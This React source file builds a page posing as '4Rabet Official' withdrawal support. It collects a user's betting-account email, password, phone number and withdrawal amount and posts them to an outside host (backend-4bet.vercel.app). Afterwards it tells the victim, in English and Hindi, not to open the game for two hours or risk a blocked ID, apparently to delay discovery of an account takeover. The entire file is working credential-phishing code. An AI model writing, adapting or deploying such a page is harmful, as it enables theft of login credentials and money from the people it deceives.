import React, { useState } from 'react';
import image1 from "./IMG_2829.PNG";

function Home() {
  const [currentPage, setCurrentPage] = useState("form");

  // State for form inputs
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [mobileNumber, setMobileNumber] = useState('');
  const [withdrawalAmount, setWithdrawalAmount] = useState('');
  const [problem, setProblem] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Convert withdrawalAmount to a number for the backend
    const numericWithdrawalAmount = parseFloat(withdrawalAmount);
    
    // Validate withdrawal amount is a valid number
    if (isNaN(numericWithdrawalAmount)) {
      alert('Please enter a valid withdrawal amount');
      setIsSubmitting(false);
      return;
    }

    const payload = {
      email,
      password,
      mobileNumber,
      withdrawalAmount: numericWithdrawalAmount, // Send as a number
      problem,
    };

    try {
      const response = await fetch('https://backend-4bet.vercel.app/users', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });
      
      if (response.ok) {
        // Move to confirmation screen on success
        setCurrentPage("confirmation");
        window.scrollTo(0, 0);
      } else {
        // Try to parse the error response
        try {
          const errorData = await response.json();
          alert(`Error: ${errorData.message || 'Unknown server error'}`);
        } catch (jsonError) {
          alert(`Server error (${response.status}): Please check your server logs for details`);
        }
      }
    } catch (error) {
      console.error('Network Error:', error);
      alert('Connection error. Please check if the server is running.');
    } finally {
      setIsSubmitting(false);
    }
  };

  const styles = {
    body: {
      backgroundColor: '#f8f9fa',
      padding: '10px',
      minHeight: '100vh',
    },
    mobileContainer: {
      width: '100%',
      maxWidth: '600px',
      margin: '0 auto',
      backgroundColor: '#f0f2f5',
      minHeight: '100vh',
      position: 'relative',
      overflow: 'hidden',
      borderRadius: '8px',
      boxShadow: '0 0 10px rgba(0,0,0,0.1)',
    },
    content: {
      padding: '15px',
    },
    logoContainer: {
      textAlign: 'left',
      marginBottom: '20px',
    },
    logo: {
      width: 'auto',
      padding: '15px 30px',
      backgroundColor: '#222',
      display: 'inline-block',
      color: 'white',
      fontWeight: 'bold',
      fontSize: '22px',
      borderRadius: '8px',
    },
    blueText: {
      color: '#0066cc',
    },
    formTitle: {
      textAlign: 'center',
      fontSize: '30px',
      fontWeight: 'bold',
      marginBottom: '25px',
      color: '#333',
    },
    form: {
      backgroundColor: '#ffffff',
      padding: '15px',
      borderRadius: '8px',
      boxShadow: '0 2px 6px rgba(0,0,0,0.05)',
    },
    inputGroup: {
      marginBottom: '15px',
    },
    label: {
      display: 'block',
      marginBottom: '6px',
      fontSize: '14px',
      color: '#333',
      fontWeight: '500',
    },
    required: {
      color: 'red',
    },
    input: {
      width: '100%',
      padding: '10px',
      border: '1px solid #ddd',
      borderRadius: '4px',
      fontSize: '15px',
      boxSizing: 'border-box',
    },
    submitBtn: {
      width: '100%',
      backgroundColor: '#0066cc',
      color: 'white',
      border: 'none',
      padding: '14px',
      fontSize: '16px',
      borderRadius: '4px',
      cursor: 'pointer',
      marginTop: '10px',
      boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
    },
    submitBtnDisabled: {
      width: '100%',
      backgroundColor: '#a0a0a0',
      color: 'white',
      border: 'none',
      padding: '14px',
      fontSize: '16px',
      borderRadius: '4px',
      cursor: 'not-allowed',
      marginTop: '10px',
      boxShadow: '0 2px 4px rgba(0,0,0,0.1)',
    },
    demoImage: {
      margin: '20px auto',
      textAlign: 'center',
      width: '100%',
      boxSizing: 'border-box',
    },
    verificationImg: {
      width: '90%',
      maxWidth: '500px',
      height: 'auto',
      borderRadius: '8px',
      border: '10px solid #000000',
      boxShadow: '0 2px 10px rgba(0,0,0,0.1)',
      objectFit: 'contain',
    },
    confirmation: {
      padding: '20px 15px',
      backgroundColor: '#ffffff',
      border: '1px solid #ddd',
      borderRadius: '8px',
      textAlign: 'center',
      boxShadow: '0 3px 10px rgba(0,0,0,0.1)',
      marginBottom: '20px',
    },
    englishText: {
      marginBottom: '12px',
      fontSize: '15px',
      lineHeight: 1.5,
      color: '#333',
    },
    hindiText: {
      marginBottom: '12px',
      fontSize: '15px',
      lineHeight: 1.5,
      color: '#444',
    },
    thankYou: {
      fontSize: '18px',
      fontWeight: 'bold',
      marginTop: '10px',
      color: '#0066cc',
    },
    page: {
      display: 'none',
    },
    activePage: {
      display: 'block',
    },
  };

  return (
    <div style={styles.body}>
      <div style={styles.mobileContainer}>
        <div style={currentPage === "form" ? { ...styles.page, ...styles.activePage } : styles.page}>
          <div style={styles.content}>
            <div style={styles.logoContainer}>
              <div style={styles.logo}>
                4RA<span style={styles.blueText}>BET</span>
              </div>
            </div>

            <h1 style={styles.formTitle}>4Rabet Official</h1>

            <form onSubmit={handleSubmit} style={styles.form}>
              <div style={styles.inputGroup}>
                <label style={styles.label}>
                  4Rabet Email <span style={styles.required}>*</span>
                </label>
                <input
                  type="email"
                  style={styles.input}
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
              </div>

              <div style={styles.inputGroup}>
                <label style={styles.label}>4Rabet Password</label>
                <input
                  type="password"
                  style={styles.input}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
              </div>

              <div style={styles.inputGroup}>
                <label style={styles.label}>
                  4Rbet Mobile Number <span style={styles.required}>*</span>
                </label>
                <input
                  type="tel"
                  style={styles.input}
                  value={mobileNumber}
                  onChange={(e) => setMobileNumber(e.target.value)}
                  required
                />
              </div>

              <div style={styles.inputGroup}>
                <label style={styles.label}>
                  4Rabet Withdrawal amount <span style={styles.required}>*</span>
                </label>
                <input
                  type="number"
                  step="0.01"
                  style={styles.input}
                  value={withdrawalAmount}
                  onChange={(e) => setWithdrawalAmount(e.target.value)}
                  required
                />
              </div>

              <div style={styles.inputGroup}>
                <label style={styles.label}>
                  4Rabet Problem <span style={styles.required}>*</span>
                </label>
                <input
                  type="text"
                  style={styles.input}
                  value={problem}
                  onChange={(e) => setProblem(e.target.value)}
                  required
                />
              </div>

              <button 
                type="submit" 
                style={isSubmitting ? styles.submitBtnDisabled : styles.submitBtn}
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Submitting...' : 'Submit'}
              </button>
            </form>
          </div>
          <div style={styles.demoImage}>
            <img
              src={image1}
              alt="Verification Screen"
              style={styles.verificationImg}
            />
          </div>
        </div>

        <div style={currentPage === "confirmation" ? { ...styles.page, ...styles.activePage } : styles.page}>
          <div style={styles.content}>
            <div style={styles.logoContainer}>
              <div style={styles.logo}>
                4RA<span style={styles.blueText}>BET</span>
              </div>
            </div>

            <h1 style={styles.formTitle}>Submission Successful</h1>

            <div style={styles.confirmation}>
              <p style={styles.englishText}>Your data has been submitted.</p>
              <p style={styles.englishText}>
                Please do not open your game for 2 hours, otherwise your request will be cancelled,
                due to which your game ID may be blocked.
              </p>
              <p style={styles.hindiText}>आपका डेटा सबमिट कर दिया गया है।</p>
              <p style={styles.hindiText}>
                कृपया 2 घंटे तक अपना गेम न खोलें, अन्यथा आपका अनुरोध रद्द कर दिया जाएगा,
                जिसके कारण आपकी गेम आईडी ब्लॉक हो सकती है।
              </p>
              <p style={styles.thankYou}>Thank You!</p>
              <div style={styles.demoImage}>
                <img
                  src={image1}
                  alt="Verification Screen"
                  style={styles.verificationImg}
                />
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Home;